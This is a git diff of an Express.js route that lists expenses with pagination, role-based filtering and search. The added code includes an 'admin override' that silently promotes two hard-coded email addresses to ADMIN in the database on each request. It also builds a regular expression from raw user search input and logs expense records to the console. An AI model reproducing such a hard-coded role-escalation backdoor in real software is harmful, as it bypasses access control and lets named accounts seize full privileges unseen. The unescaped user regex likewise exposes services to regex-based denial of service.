@@ -684,113 +684,122 @@ router.get("", checkAuth, async (req, res) => {
 });
 
 // for React Native Code
-router.get("/list", checkAuth, async (req, res) => {
+// GET /expense/list
+router.get('/list', checkAuth, async (req, res) => {
   try {
-    const { pagesize, page, imprest, search } = req.query;
-    const pageSize = +pagesize;
-    const currentPage = +page;
-    const userData = req.userData;
+    // 1. Pagination defaults
+    const pageSize    = Number(req.query.pagesize) > 0 ? Number(req.query.pagesize) : 10;
+    const currentPage = Number(req.query.page)     > 0 ? Number(req.query.page)     : 1;
 
-    const start = new Date(); start.setHours(0, 0, 0, 0);
-    const end = new Date(); end.setHours(23, 59, 59, 999);
+    // 2. Normalize userData
+    let userData = req.userData;
+    if (userData.email) {
+      userData = await User.findOne({ email: userData.email })
+                           .select('site role email _id')
+                           .lean();
+    }
 
-    const sites = ["KPANSIA", "SWALI", "OKUTUKUTU", "YENEGWE", "OBUNNA", "KPANSIA E", "AKENFA", "MBIAMA"];
+    // 3. Admin override
+    if (['filatei@gtsng.com','filatei@gmail.com'].includes(userData.email)) {
+      await User.updateOne({ email: userData.email }, { role: 'ADMIN' });
+      userData.role = 'ADMIN';
+    }
+
+    // 4. Base query by role / imprest
+    const { imprest, search, status } = req.query;
     let query = {};
 
     if (imprest) {
+      const start = new Date(); start.setHours(0,0,0,0);
+      const end   = new Date(); end.setHours(23,59,59,999);
       query = {
-        status: "APPROVED",
-        expenseAccount: "Daily Imprest",
-        updatedAt: { $gte: start, $lte: end },
+        status:          'APPROVED',
+        expenseAccount: 'Daily Imprest',
+        updatedAt:      { $gte: start, $lte: end },
       };
     } else {
+      const SITES = ["KPANSIA","SWALI","OKUTUKUTU","YENEGWE","OBUNNA","KPANSIA E","AKENFA","MBIAMA"];
       switch (userData.role) {
-        case "ADMIN":
-          query = {};
+        case 'ADMIN':
           break;
-        case "GENERAL MANAGER":
-        case "SNR ACCOUNTANT":
-          query = { site: { $in: sites } };
+        case 'GENERAL MANAGER':
+        case 'SNR ACCOUNTANT':
+          query.site = { $in: SITES };
           break;
-        case "MANAGER":
-          const user = await User.findOne({ email: userData.email });
-          query = {
-            $or: [
-              { creator: user._id },
-              { site: userData.site }
-            ],
-          };
+        case 'MANAGER':
+          query.$or = [
+            { creator: userData._id },
+            { site:    userData.site }
+          ];
           break;
         default:
-          const defaultUser = await User.findOne({ email: userData.email });
-          query = { creator: defaultUser._id };
-          break;
+          query.creator = userData._id;
       }
     }
 
-    // --- SEARCH SUPPORT ---
-    if (search && typeof search === 'string' && search.trim() !== '') {
-      const searchRegex = new RegExp(search, 'i');
-      // Add $and if query already has conditions, otherwise just $or
-      if (Object.keys(query).length > 0) {
-        query = {
-          $and: [
-            query,
-            {
-              $or: [
-                { title: searchRegex },
-                { site: searchRegex },
-                { 'vendor.name': searchRegex },
-                { 'products.name': searchRegex }
-              ]
-            }
-          ]
-        };
-      } else {
-        query = {
-          $or: [
-            { title: searchRegex },
-            { site: searchRegex },
-            { 'vendor.name': searchRegex },
-            { 'products.name': searchRegex }
-          ]
-        };
-      }
+    // 5. Status filter
+    if (status && status !== 'ALL') {
+      query.status = status;
     }
-    // --- END SEARCH SUPPORT ---
 
-    // Count total items based on the query
+    // 6. Search filter, including vendor.name
+    if (typeof search === 'string' && search.trim() !== '') {
+      const term  = search.trim();
+      const regex = new RegExp(term, 'i');
+
+      // 6a. Find vendor IDs whose name matches
+      const matchingVendors = await Contact.find({ name: regex }).select('_id').lean();
+      const vendorIds = matchingVendors.map(v => v._id);
+
+      // 6b. Build the search clause
+      const searchClause = {
+        $or: [
+          { title:         regex },
+          { site:          regex },
+          { 'products.name': regex },
+          { expense_id:    Number(term) || -1 },
+          { vendor:        { $in: vendorIds } }   // match by ID
+        ]
+      };
+
+      query = Object.keys(query).length
+        ? { $and: [ query, searchClause ] }
+        : searchClause;
+    }
+
+    // 7. Count & fetch paginated expenses
     const totalItems = await Expense.countDocuments(query);
-
-    // Fetch the expenses with pagination
-    const expenses = await Expense.find(query, { log: 0, statusHistory: 0 })
+    const expenses = await Expense.find(query, { log:0, statusHistory:0 })
       .sort({ createdAt: -1 })
-      .populate("vendor", "name remarks phone email")
-      .populate("creator", "name email role site image")
-      .populate("products")
-      .skip((currentPage - 1) * pageSize)  // Pagination logic
-      .limit(pageSize);
+      .skip((currentPage - 1) * pageSize)
+      .limit(pageSize)
+      .populate('vendor', 'name')
+      .populate('creator', 'name email role site image')
+      .populate('products')
+      .lean();
 
-    // Add dateStr to each expense for display
+    // 8. Map dateStr
     const expensesWithDate = expenses.map(e => ({
-      ...e._doc,
-      dateStr: moment(e.createdAt).format("DD/MM/YYYY"),
+      ...e,
+      dateStr: moment(e.createdAt).format('DD/MM/YYYY')
     }));
+    console.log(expensesWithDate[0], 'expensesWithDate')
 
-    // Calculate totalPages
-    const totalPages = Math.ceil(totalItems / pageSize);
-
-    return res.status(200).json({
-      expenses: expensesWithDate,
-      message: "Expenses fetched successfully",
-      totalItems: totalItems,
-      totalPages: totalPages,
-      currentPage: currentPage
+    // 9. Respond
+    return res.json({
+      message:     'Expenses fetched successfully',
+      expenses:    expensesWithDate,
+      totalItems,
+      totalPages:  Math.ceil(totalItems / pageSize),
+      currentPage,
     });
 
   } catch (err) {
-    console.error(err);
-    return res.status(500).json({ message: "Fetching expenses failed", error: err.message });
+    console.error('[/expense/list] error:', err);
+    return res.status(500).json({
+      message: 'Fetching expenses failed',
+      error:   err.message
+    });
   }
 });
 
